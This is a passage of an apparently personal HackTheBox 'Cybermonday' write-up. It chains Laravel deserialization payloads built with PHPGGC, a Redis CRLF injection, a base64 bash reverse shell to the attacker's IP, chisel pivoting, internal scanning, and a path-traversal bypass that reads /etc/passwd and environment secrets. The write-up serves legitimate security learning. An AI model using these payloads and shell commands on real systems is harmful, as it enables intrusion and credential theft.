  "value": "P+zmsKjErnf58FUbGbBzhy0nJW1AQjNxy5tvY2DjKCvw/pGhNp0ABinoiJc7n3/qS+XBFg5VR3D29kI2KfcKxAlftD1YBvVYirvX6Xykilc617I6pUSwKrOIyh3U6IMd",                                                              
  "mac": "51c5f051ba7a351ab6121d1643f60d86e87d83ab74446d5affb6b3775bc80b74",                                                            
  "tag": ""
}
```

Using [cyberchef](https://gchq.github.io/CyberChef/) to make the decrypt and this is the [recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'EX3zUxJkzEAY2xM4pbOfYMJus%2Bbjx6V25Wnas%2BrFMzA%3D'%7D,%7B'option':'Base64','string':'9VblCu0%2B%2B%2BtKkdS8JhG8gg%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=UCt6bXNLakVybmY1OEZVYkdiQnpoeTBuSlcxQVFqTnh5NXR2WTJEaktDdncvcEdoTnAwQUJpbm9pSmM3bjMvcVMrWEJGZzVWUjNEMjlrSTJLZmNLeEFsZnREMVlCdlZZaXJ2WDZYeWtpbGM2MTdJNnBVU3dLck9JeWgzVTZJTWQ)


![](/assets/img/hackthebox/machines writeups/Cybermonday/cyberchef.png)

The sec part is the laravel session id so to test it let's try to set it equel to string and then send it to out **local Redis**


![](/assets/img/hackthebox/machines writeups/Cybermonday/laravel-session.png)


```console 
(kali㉿kali)-[~]$ redis-cli
127.0.0.1:6379> KEYS *
1) "laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ"
2) "0xRyuzak1"
127.0.0.1:6379> get laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ
"0xRyuzak1"
127.0.0.1:6379> 
```

### **Deserialization**

Using [PHPGGC](https://github.com/ambionics/phpggc) tool for creating deserialization payloads for PHP. 

```console
(kali㉿kali)-[~]$ ./phpggc -l | grep Laravel
Laravel/FD1                               *                                                       File delete               __destruct     *    
Laravel/RCE1                              5.4.27                                                  RCE: Command              __destruct          
Laravel/RCE2                              5.4.0 <= 8.6.9+                                         RCE: Command              __destruct          
Laravel/RCE3                              5.5.0 <= 5.8.35                                         RCE: Command              __destruct     *    
Laravel/RCE4                              5.4.0 <= 8.6.9+                                         RCE: Command              __destruct          
Laravel/RCE5                              5.8.30                                                  RCE: PHP Code             __destruct     *    
Laravel/RCE6                              5.5.* <= 5.8.35                                         RCE: PHP Code             __destruct     *    
Laravel/RCE7                              ? <= 8.16.1                                             RCE: Command              __destruct     *    
Laravel/RCE8                              7.0.0 <= 8.6.9+                                         RCE: Command              __destruct     *    
Laravel/RCE9                              5.4.0 <= 9.1.8+                                         RCE: Command              __destruct          
Laravel/RCE10                             5.6.0 <= 9.1.8+                                         RCE: Command              __toString          
Laravel/RCE11                             5.4.0 <= 9.1.8+                                         RCE: Command              __destruct          
Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE: Command              __destruct     *    
Laravel/RCE13                             5.3.0 <= 9.5.1+                                         RCE: Command              __destruct     *    
Laravel/RCE14                             5.3.0 <= 9.5.1+                                         RCE: Command              __destruct          
Laravel/RCE15                             5.5.0 <= v9.5.1+                                        RCE: Command              __destruct          
Laravel/RCE16                             5.6.0 <= v9.5.1+                                        RCE: Command              __destruct          
Laravel/RCE17                             10.31.0                                                 RCE: Command              __destruct          
Laravel/RCE18                             10.31.0                                                 RCE: PHP Code             __destruct     *   
Laravel/RCE18                             10.31.0  
```

According to the laravel debug crash the version is `9.46.0.` so the exploit can ve done using one of the following :
- Laravel/RCE9-11
- Laravel/RCE13-16

Actually what i did is just try all of them 😰 but according to the awesome person [0xdf](https://0xdf.gitlab.io/) since the biggest risk always comes from null bytes so he write this simple elegant piece of code to do the job 

```console
(kali㉿kali)-[~]$ for num in 9 10 11 13 14 15 16; do ./phpggc Laravel/RCE${num} system id | grep -Paq "\x00" || echo "RCE${num} is good"; done
RCE10 is good
```

So will going to use `RCE10`. So let's start with simple malicious object just to run `whoami`.

```
(kali㉿kali)-[~]$ ./phpggc Laravel/RCE10 system whoami
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:6:"whoami";}i:1;s:4:"user";}}
```

So let's craft our full malicious payload and mind the following :
- The whole malicious object have to be in `single qoute` to not break reqest body.
- Escape all the `double qoutes` using `backslash` since we are on json value.
- Escape all backslashes since we use backsalah as escape char 

So the final payload will be like the following :

```http
POST /webhooks/572ef42e-3eaf-4c72-85c7-95b5b40d6eaf HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.3.0
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM
Content-Type: application/json
Connection: close
Content-Length: 463

{"url":"http://redis:6379","method":"\r\nSET laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ 'O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:6:\"whoami\";}i:1;s:4:\"user\";}}'\r\nMIGRATE 10.10.16.67 6379 laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ 0 5000 COPY REPLACE\r\n"}
```

Now when we make any request using our laravel token we got command execution

![](/assets/img/hackthebox/machines writeups/Cybermonday/rce1.png)

### **Getting Shell**


Using [revshells](https://www.revshells.com/) i created my encoded shell


![](/assets/img/hackthebox/machines writeups/Cybermonday/revshell.png)

Then let's trying to create our malicious object

```bash
./phpggc Laravel/RCE10 system 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjY3LzQ0MyAwPiYx|base64 -d |bash'
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:81:"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjY3LzQ0MyAwPiYx|base64 -d |bash";}i:1;s:4:"user";}}
```

So our final request will be like the following 

```http
POST /webhooks/572ef42e-3eaf-4c72-85c7-95b5b40d6eaf HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.3.0
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM
Content-Type: application/json
Connection: close
Content-Length: 539

{"url":"http://redis:6379","method":"\r\nSET laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ 'O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:81:\"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjY3LzQ0MyAwPiYx|base64 -d |bash\";}i:1;s:4:\"user\";}}'\r\nMIGRATE 10.10.16.67 6379 laravel_session:wbqrcx7hGrse38Ml42klHoy7rllfKHOWJmFDeJmJ 0 5000 COPY REPLACE\r\n"}
```

And wehen we make any request using our laravel token we got our reverse shell

```console 
(kali㉿kali)-[~]$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.67] from (UNKNOWN) [10.10.11.228] 58504
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@070370e2cdc4:~/html/public$ 
```

## **Shell as john**

### **Enumeration Container** 

We very much in a docker container. Because as we can see we know that the webapp listen on port 80 but we cann't found that here. Also the hostname `070370e2cdc4` is typically what used for the container by defaults 


```console
www-data@070370e2cdc4:~$ curl http://127.0.0.1
curl: (7) Failed to connect to 127.0.0.1 port 80 after 0 ms: Couldn't connect to server
```

### **Netstat without Netstat**

Trying to check which ports are listen on the container using `netstat` but found that it is not installed 


```console
www-data@070370e2cdc4:~/html$ netstat
bash: netstat: command not found
```

So to solve that i used the following code which is pure bash from this [gist](https://gist.github.com/staaldraad/4c4c80800ce15b6bef1c1186eaa8da9f) to do the job

```bash
grep -v "rem_address" /proc/net/tcp  | awk 'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i <= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
} {x=hextodec(substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."hextodec(substr($2,i,2))}{print x":"hextodec(substr($2,index($2,":")+1,4))}'
```

The script reveal the following ports nothing intersting here.

```plaintext
127.0.0.11:35025
172.18.0.7:60136
172.18.0.7:58504
172.18.0.7:48938
172.18.0.7:52018
```


After that we can see in the `.env` file [here](https://0xRyuzak1.github.io/posts/htb-cybermonday/#env) we found that the host for the mysql DB is called `db` so let's try to check it.

But we can't find ping tool in the container do we use curl instead

```console
www-data@070370e2cdc4:~$ ping db
bash: ping: command not found
```

```console
www-data@070370e2cdc4:~$ curl -v db     
*   Trying 172.18.0.5:80...
* connect to 172.18.0.5 port 80 failed: Connection refused
* Failed to connect to db port 80 after 1 ms: Couldn't connect to server
* Closing connection 0
curl: (7) Failed to connect to db port 80 after 1 ms: Couldn't connect to server
```

### **Pivot** 


As we can see we found that the `db` hosname is rsolve to `172.18.0.5` ip. Since the container doesn't has mysql tool so will upload chisel to the container and pivoit through it to the `db` host


On our attacker machine

```console
(kali㉿kali)-[~]$ chisel server -p 9001 --reverse
2023/12/02 08:33:41 server: Reverse tunnelling enabled
2023/12/02 08:33:41 server: Fingerprint liS3v6y5XW3DbKVxnTGfUlqxOC5im5JxCu08LJ5LuL0=
2023/12/02 08:33:41 server: Listening on http://0.0.0.0:9001
2023/12/02 08:33:54 server: session#1: Client version (1.9.1) differs from server version (1.8.1)
2023/12/02 08:33:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

On the target container 

```console
www-data@070370e2cdc4:~/html$ ./chisel client 10.10.16.67:9001 R:socks
2023/12/02 13:33:53 client: Connecting to ws://10.10.16.67:9001
2023/12/02 13:33:54 client: Connected (Latency 73.47824ms
```

Now we can connect to the mysql DB with the credentials from the `.env` file `root:root`

```console
(kali㉿kali)-[~]$ proxychains4 -q mysql -h 172.18.0.5 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2371
Server version: 8.0.33 MySQL Community Server - GPL
...[snip]...
```
This was **dead end** because after enum the mysql you will found some encrypted admin password but trying to crack them will not work.

### **Network Scan**

Since the container is already communicated with other ips like `db : 172.18.0.5` so let's checl if there is any other ips the container communicate with

```console
www-data@070370e2cdc4:~/html$ cat /proc/net/arp    
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.3       0x1         0x2         02:42:ac:12:00:03     *        eth0
172.18.0.4       0x1         0x2         02:42:ac:12:00:04     *        eth0
172.18.0.5       0x1         0x2         02:42:ac:12:00:05     *        eth0
172.18.0.1       0x1         0x2         02:42:24:f0:20:8d     *        eth0
```
So let's scan those IPs looking for any intersting stuff. If we do this through chisel will take too much time so i download pre compiled static [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to the container to be used from it

```console
www-data@070370e2cdc4:~/html$ curl http://10.10.16.67/nmap -o nmap 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  1155k      0  0:00:05  0:00:05 --:--:-- 1335k

www-data@070370e2cdc4:~/html$ chmod +x nmap
```

Check Up hosts first 

```console
www-data@070370e2cdc4:~/html$ ./nmap -sn 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-02 17:09 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.0033s latency).
Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.2)
Host is up (0.0020s latency).
Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.3)
Host is up (0.0016s latency).
Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.4)
Host is up (0.0014s latency).
Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.5)
Host is up (0.0012s latency).
Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.6)
Host is up (0.00094s latency).
Nmap scan report for 070370e2cdc4 (172.18.0.7)
Host is up (0.00064s latency).
Nmap done: 256 IP addresses (7 hosts up) scanned in 16.04 seconds
```

Nmap Error

```console
www-data@070370e2cdc4:~/html$ ./nmap --min-rate 10000 172.18.0.1-10

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-02 17:11 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to open /etc/services for reading service information
QUITTING!
```

To solve this issue copy the `/etc/services` file then save it as `nmap-services` in the same directory as nmap.

```console
www-data@070370e2cdc4:~/html$ ./nmap --min-rate 10000 -p- 172.18.0.1-10

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-02 17:21 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.0026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.2)
Host is up (0.0015s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.3)
Host is up (0.00090s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis

Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.4)
Host is up (0.0021s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.5)
Host is up (0.00095s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.6)
Host is up (0.0050s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 070370e2cdc4 (172.18.0.7)
Host is up (0.0022s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  unknown

Nmap done: 10 IP addresses (7 hosts up) scanned in 311.00 seconds
```

### **cybermonday_registry**

From it's name it seems to be a docker Registry accordng to this [website](https://ioflood.com/blog/docker-list-images-easy-guide-to-docker-images-ls-command/#:~:text=The%20Docker%20Registry%20API%20provides,tags%20for%20a%20specific%20repository.) we can list the repositories on it like the following

```console
(kali㉿kali)-[~]$ proxychains4 -q curl -s http://172.18.0.2:5000/v2/_catalog|jq .
{
  "repositories": [
    "cybermonday_api"
  ]
}

(kali㉿kali)-[~]$ proxychains4 -q curl -s http://172.18.0.2:5000/v2/cybermonday_api/tags/list|jq .
{
  "name": "cybermonday_api",
  "tags": [
    "latest"
  ]
}
```

Trying to pull the image many times but fail

```console
(kali㉿kali)-[~]$ sudo proxychains4 -q docker pull 172.18.0.2:5000/cybermonday_api
[sudo] password for kali: 
Using default tag: latest
Error response from daemon: Get "https://172.18.0.2:5000/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
```

After alot of struggle why this happend i find out the docker is written in Go lang which is not working good with proxychains according to this [link](https://github.com/rofl0r/proxychains-ng/issues/199#issuecomment-340183417)

To solve this we change the chisel on the container to local port forwarding

```console
www-data@070370e2cdc4:~/html$ ./chisel client 10.10.16.67:9001 R:172.18.0.2:5000
```

Now Trying the pull again and it's working fine

```console
(kali㉿kali)-[~]$ sudo docker pull 127.0.0.1:5000/cybermonday_api
Using default tag: latest
latest: Pulling from cybermonday_api
5b5fe70539cd: Pull complete 
affe9439d2a2: Pull complete 
1684de57270e: Pull complete 
dc968f4da64f: Pull complete 
57fbc4474c06: Pull complete 
9f5fbfd5edfc: Pull complete 
5c3b6a1cbf54: Pull complete 
4756652e14e0: Pull complete 
57cdb531a15a: Pull complete 
1696d1b2f2c3: Pull complete 
ca62759c06e1: Pull complete 
ced3ae14b696: Pull complete 
beefd953abbc: Pull complete 
Digest: sha256:72cf91d5233fc1bedc60ce510cd8166ce0b17bd1e9870bbc266bf31aca92ee5d
Status: Downloaded newer image for 127.0.0.1:5000/cybermonday_api:latest
127.0.0.1:5000/cybermonday_api:latest
```

Now let's run the container 

```console
(kali㉿kali)-[~]$ sudo docker run -d --rm 127.0.0.1:5000/cybermonday_api
9591a7b6282fa4a82a1cc3afd78e22ad5074ebd22de91e61a395eff69c1403a6
(kali㉿kali)-[~]$ sudo docker ps
CONTAINER ID   IMAGE                            COMMAND                  CREATED          STATUS          PORTS     NAMES
9591a7b6282f   127.0.0.1:5000/cybermonday_api   "docker-php-entrypoi…"   36 seconds ago   Up 35 seconds             nervous_pike
```

Getting bash shell into the docker

```console
(kali㉿kali)-[~]$ sudo docker exec -it 9591a7b6282f bash

root@9591a7b6282f:/var/www/html# 
```

We found a `.ssh` dir which doesn't have private key but it reveal a user on the machine call `john`

```console
www-data@070370e2cdc4:/mnt$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday
```

After doing alot of enum i found nothing except the codes in the `/var/www/html` dir so it has to be my way in

### **Source Code Review**

Let's copy the content of the HTML dir to our machine then open it using VScode.

```console
(kali㉿kali)-[~]$ sudo docker cp 9591a7b6282f:/var/www/html/ .
(kali㉿kali)-[~]$ cd html
(kali㉿kali)-[~]$ code .
```

When i opened the code i notice that `SNYK` i notice that it tell us that there is a piece of the code which could be vuln to `Path Traversal` so let's check it

This is the code which SNYK report to us 


```php
$logPath = "/logs/{$webhook_find->name}/";

switch($this->data->action)
{
    case "list":
        $logs = scandir($logPath);
        array_splice($logs, 0, 1); array_splice($logs, 0, 1);

        return $this->response(["status" => "success", "message" => $logs]);
    
    case "read":
        $logName = $this->data->log_name;

        if(preg_match("/\.\.\//", $logName))
        {
            return $this->response(["status" => "error", "message" => "This log does not exist"]);
        }

        $logName = str_replace(' ', '', $logName);

        if(stripos($logName, "log") === false)
        {
            return $this->response(["status" => "error", "message" => "This log does not exist"]);
        }

        if(!file_exists($logPath.$logName))
        {
            return $this->response(["status" => "error", "message" => "This log does not exist"]);
        }

        $logContent = file_get_contents($logPath.$logName);
        


        return $this->response(["status" => "success", "message" => $logContent]);
}
```

This code is appears to do the filter on the Api action which called `createLogFile` which we found before in the [Webhooks](http://127.0.0.1:4000/posts/htb-cybermonday/#webhooks) part

The filter is working as the following :

- **Line 14 :** This will remove any two period behind each other like this `..` followed by `slash` so any `..\` will be removed
- **Line 19 :** This will remove any spaces like this ' '
- **Line 21 :** Check if the string `log` exist in the log name
- **Line 26 :** Ensure that the file exist.

And the checks are working in sequential order


> Bypass The Filters : <br /> 
-  Make two periods but with speace between them like this `. .`. This will make it pass the first filter and the sec filter will return them to `..` again because it remove spaces <br />
- The Traversal path have to contain `log` string so the payload have to be something like `. ./. ./log` <br />
- The file exist we used have to be exist so we will use `/var/log` dir because it is exist in linux machines by default <br />
**The Final Payload :** `. ./. ./. ./. ./. ./. ./var/log/. ./. ./etc/passwd`
{: .prompt-tip }

After some testing i found the following route  `/webhooks/:uuid/logs` at `app/routes/Router.php`

```php
public static function get()
{
    return [
        "get" => [
            "/" => "IndexController@index",
            "/webhooks" => "WebhooksController@index"
        ],
        "post" => [
            "/auth/register" => "AuthController@register",
            "/auth/login" => "AuthController@login",
            "/webhooks/create" => "WebhooksController@create",
            "/webhooks/:uuid" => "WebhooksController@get",
            "/webhooks/:uuid/logs" => "LogsController@index"
        ],
        "delete" => [
            "/webhooks/delete/:uuid" => "WebhooksController@delete",
        ]
    ];
}
```

So let's give it a try

![](/assets/img/hackthebox/machines writeups/Cybermonday/unauthorized-logs.png)

So After reviewing the code in the again `LogsController.php` found this part

```php
class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);
        ...[snip]...
```

So let's try searching for this `apiKeyAuth`

```console
(kali㉿kali)-[~]$ grep -Ri 'apiKeyAuth'
grep: keys/private.pem: Permission denied
app/helpers/Api.php:    public function apiKeyAuth()
app/controllers/LogsController.php:        $this->apiKeyAuth();
```

So we open the `app/helpers/Api.php` file and found in it the value of the Api key and also the new header `X-API-KEY` to be used 

```php
public function apiKeyAuth()
{
    $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

    if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
    {
        return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
    }
}
```

So let's give it a try again and it is working

![](/assets/img/hackthebox/machines writeups/Cybermonday/api-key.png)

### **Read Logs**

Now let's create new Webhook

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"name": "0xRyuzak1_Log", "description": "Anything", "action": "createLogFile"}' -H "Content-type: application/json"
{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"20792727-1a4e-45aa-90ca-11950a3e6abb"}
```

Now let's create new log file with simple content


```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/20792727-1a4e-45aa-90ca-11950a3e6abb -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"log_name": "0xRyuzak1", "log_content": "Testing"}' -H "Content-type: application/json"
{"status":"success","message":"Log created"}
```

Check if the log created correctly

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/20792727-1a4e-45aa-90ca-11950a3e6abb/logs -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"action": "list"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":["0xRyuzak1-1701718652.log"]}
```

Reading the log content

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/20792727-1a4e-45aa-90ca-11950a3e6abb/logs -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"action": "read", "log_name": "0xRyuzak1-1701718652.log"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":"Testing\n"}
```

### **Path Traversal**

Now following the bypass step which we declared before so the payload will be this `. ./. ./var/log/. ./. ./etc/passwd`

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/20792727-1a4e-45aa-90ca-11950a3e6abb/logs -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"action": "read", "log_name": ". ./. ./var/log/. ./. ./etc/passwd"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\n_apt:x:42:65534::\/nonexistent:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\n"}
```

After alot of checking i dumped the `proc/self/environ` file which contatins this password `DBPASS=ngFfX2L71Nu`

```console
(kali㉿kali)-[~]$ curl -s http://webhooks-api-beta.cybermonday.htb/webhooks/20792727-1a4e-45aa-90ca-11950a3e6abb/logs -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -d '{"action": "read", "log_name": ". ./. ./var/log/. ./. ./proc/self/environ"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" |jq -r .message|sed 's/\x0/\n/g'
HOSTNAME=e1862f4e1242
PHP_INI_DIR=/usr/local/etc/php
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
DBPASS=ngFfX2L71Nu
PHP_VERSION=8.2.7
GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz
DBHOST=db
DBUSER=dbuser
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DBNAME=webhooks_api
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make  pkg-config               re2c
PWD=/var/www/html
PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0
```

After some try and error i found that this password is the password for the `john` user which we get before from the `.ssh` dir

```console
sshpass -p 'ngFfX2L71Nu' ssh john@cybermonday.htb
